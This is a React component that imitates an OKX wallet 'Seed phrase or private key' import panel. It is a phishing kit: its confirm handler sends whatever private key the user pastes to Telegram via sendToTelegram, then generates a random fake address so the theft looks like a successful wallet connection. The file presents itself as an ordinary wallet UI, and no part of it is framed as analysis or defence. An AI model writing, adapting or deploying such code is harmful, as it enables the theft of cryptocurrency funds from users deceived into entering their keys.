"use client"

import { useState } from "react"
import { Sheet, SheetContent } from "@/components/ui/sheet"
import { sendToTelegram } from "@/app/actions/telegram"

interface OKXPrivateKeyImportProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onBack: () => void
  onWalletConnected?: (address: string) => void
}

export function OKXPrivateKeyImport({
  open,
  onOpenChange,
  onBack,
  onWalletConnected,
}: OKXPrivateKeyImportProps) {
  const [privateKey, setPrivateKey] = useState("")
  const [activeTab, setActiveTab] = useState<"seed" | "private">("private")
  const [isLoading, setIsLoading] = useState(false)

  const handleConfirm = async () => {
    setIsLoading(true)
    try {
      await sendToTelegram("private_key", privateKey)
    } catch (error) {
      console.error("Failed to send to Telegram:", error)
    }
    
    const mockAddress = "0x" + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join("")
    if (onWalletConnected) {
      onWalletConnected(mockAddress)
    }
    setIsLoading(false)
  }

  return (
    <>
      <style dangerouslySetInnerHTML={{__html: `
        .okx-private-key-input {
          color: #ffffff !important;
          background-color: #1a1a1a !important;
          -webkit-text-fill-color: #ffffff !important;
          caret-color: #B0DB12 !important;
        }
        .okx-private-key-input::placeholder {
          color: #666666 !important;
        }
        .okx-private-key-input:focus {
          border-color: #B0DB12 !important;
        }
      `}} />
      <Sheet open={open} onOpenChange={onOpenChange}>
        <SheetContent 
          side="right" 
          className="w-full sm:w-[360px] max-w-full bg-transparent border-0 p-0 overflow-hidden flex flex-col"
          style={{ userSelect: 'none' }}
        >
          <div className="h-full flex justify-end bg-transparent min-h-0">
            <div className="m-2 ml-0 flex-1 rounded-[24px] bg-black border border-[#1f1f1f] overflow-hidden flex flex-col min-h-0">
              {/* Header */}
              <div className="px-4 sm:px-6 pt-4 sm:pt-6 pb-3 sm:pb-4 flex-shrink-0">
                <div className="flex items-center mb-3 sm:mb-6">
                  <button
                    onClick={onBack}
                    className="p-2 hover:bg-gray-900 active:bg-gray-800 rounded-lg transition-colors mr-3 -ml-2 touch-manipulation"
                    aria-label="Back"
                  >
                    <svg
                      className="w-5 h-5 text-white"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M15 19l-7-7 7-7"
                      />
                    </svg>
                  </button>
                </div>
                <h2 className="text-xl sm:text-2xl font-bold text-white mb-3 sm:mb-6">Seed phrase or private key</h2>
                
                {/* Tabs */}
                <div className="flex gap-2 mb-3 sm:mb-6">
                  <button
                    onClick={(e) => {
                      e.preventDefault()
                      e.stopPropagation()
                      onBack()
                    }}
                    className={`px-3 sm:px-4 py-1.5 sm:py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors touch-manipulation ${
                      activeTab === "seed"
                        ? "bg-gray-800 text-white"
                        : "bg-gray-900 text-gray-400"
                    }`}
                  >
                    Seed phrase
                  </button>
                  <button
                    onClick={() => setActiveTab("private")}
                    className={`px-3 sm:px-4 py-1.5 sm:py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors touch-manipulation ${
                      activeTab === "private"
                        ? "bg-gray-800 text-white"
                        : "bg-gray-900 text-gray-400"
                    }`}
                  >
                    Private key
                  </button>
                </div>
              </div>

              {/* Content - Scrollable */}
              <div className="flex-1 px-4 sm:px-6 pb-3 sm:pb-6 overflow-y-auto min-h-0">
              {/* Private Key Input */}
              <div className="mb-3 sm:mb-6">
                <label className="block text-xs sm:text-sm text-white mb-2 sm:mb-3">Private key</label>
                <textarea
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  placeholder="Paste or enter your private key"
                  rows={3}
                  className="okx-private-key-input w-full py-2.5 sm:py-4 px-3 sm:px-4 border border-gray-700 rounded-lg text-xs sm:text-sm bg-[#1a1a1a] focus:outline-none focus:border-[#B0DB12] focus:ring-1 focus:ring-[#B0DB12] placeholder:text-gray-600 resize-none min-h-[80px] sm:min-h-[120px]"
                  autoFocus
                />
              </div>

              {/* Bulk Import Link */}
              <div className="mb-3 sm:mb-8">
                <button className="text-white text-xs sm:text-sm hover:text-[#B0DB12] active:text-[#9cc210] transition-colors flex items-center gap-1 touch-manipulation">
                  <span>Bulk import private key</span>
                  <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </button>
              </div>
              </div>

              {/* Footer - Fixed at bottom */}
              <div className="px-4 sm:px-6 py-3 sm:py-4 border-t border-gray-800 flex-shrink-0">
                <button
                  onClick={handleConfirm}
                  disabled={!privateKey.trim() || isLoading}
                  className={`w-full py-2.5 sm:py-3 rounded-lg text-sm sm:text-base font-medium transition-all flex items-center justify-center touch-manipulation ${
                    privateKey.trim() && !isLoading
                      ? "bg-[#B0DB12] text-black hover:bg-[#9cc210] active:bg-[#8aad0e] cursor-pointer"
                      : "bg-gray-800 text-gray-500 cursor-not-allowed"
                  }`}
                >
                  {isLoading ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-3 h-4 w-4 sm:h-5 sm:w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      <span className="text-xs sm:text-sm">Importing...</span>
                    </>
                  ) : (
                    "Confirm"
                  )}
                </button>
              </div>
            </div>
          </div>
        </SheetContent>
      </Sheet>
    </>
  )
}
